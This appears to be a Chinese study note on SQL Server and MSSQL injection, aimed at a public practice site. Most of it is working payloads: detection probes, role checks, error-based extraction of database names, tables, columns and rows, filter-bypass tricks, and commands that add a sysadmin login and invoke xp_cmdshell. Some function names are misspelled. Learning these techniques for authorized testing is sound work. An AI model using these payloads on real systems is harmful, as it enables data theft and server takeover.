#### sqlserver数据库介绍及操作

默认端口1433；

创建一个数据库，默认创建在路径中web.mdf;

任务，分离，删除链接，然后把创建的文件在默认路径中删掉就可以了；



1. 基础的查询语句：增删改查

   ` select * from table`

2. 数据库权限

   sa、db、public权限

   sa权利很大，db相当于普通票哪个用户，public相当于windows的guest用户；

#### 连接调用sqlserver数据库

调用数据库的代码，一般写在配置文件里面config, conn；

```vbscript
<%
    set conn = server.createobject("adodb.connecton")
    conn.open "provider=sqloledb;source=local;uid=sa;pwd=***;database=database-name"
 %>
```

可能在的目录：==inc==/conn.asp，config.asp，web.config

#### sqlserver注入

判断是否有注入

```mssql
1. 判断是否有注入  (会有变化)
and 1=1
and 1=2
/
-0
/*判断注入的方法是一样的*/

2. 初步判断是否是mssql
and user>0

3. 判断数据库系统
and (select count(*) from sysobjects)>0    /*mssql的系统表*/
and (select count(*) from msysobjects)>0   /*access的系统表*/

4. 注入参数是字符
and 

10. 测试权限结构   返回正常的话，就是对应的权限
and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
and 1=(select IS_SRROLEMEMEMBER('serveradmin'));--
and 1=(select IS_SRROLEMEMEMBER('setupadmin'));--
and 1=(select IS_SRROLEMEMEMBER('securityadmin'));--
and 1=(select IS_SRROLEMEMEMBER('diskadmin'));--
and 1=(select IS_SRROLEMEMEMBER('bulkadmin'));--
adn 1=(select IS_MEMBER('db_owner'));--

11. 添加mssql和系统账户
exec master.dbo.sp_addlogin username;--
exec master.dbo.sp_password null, username,password;--
exec master.dbo.sp_addsrvrolemember sysadmin username;--
exec master.dbo.xp_cmdshell username;--
.....

```

- 手工判断注入

  `http://testasp.vulnweb.com/showforum.asp?id=0 '` 

- 获取数据库信息

  `id=1 and 1=(select @@version)  # 因为后面的查询结果是字符类型，转换失败，就爆出错误了`

  `id=@@version   # 等价` 

- 获取当前数据库名称

  `id=1 and 1=(select db_name())  # 也是由于类型不匹配`

- 获取第一个用户数据库

  `and 1=(select top 1 name from master..sysdatabases where dbid>4)`

  *获取从上往下数的第一行的name属性*

  - 判断接下来的数据库:

  `and 1=(select top 1 name from master..sysdatabases where dbid>5)` or

  `and 1=(select top 1 name from master..sysdatabases where dbid>4 and name<>'web')`

  会爆出错误：将nvarchar值'bookmis'转换为int类型时失败

  - ==非常牛逼的一个方法==

  `and 1=(select name from master..sysdatabases for xml path) # 把所有的数据库名按照xml列出`

- 获取第一张表

  `?id=1 and 1=(select top 1 name from sysobjects where xtype='u') #原理就是mssql报错信息`

- 获取表readers的列

  `?id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='readers'))`

- 获取表的数据

  `?id=1 and 1=(select top 1 Reader_id from readers)`

有过滤，如何绕过？

​	比如大小写转换，%0a、+、/**/代替空格； *+ 为什么可以代替空格？*

#### sqlserver另类玩法

#### sqlserver差异备份、完全备份、权限入侵
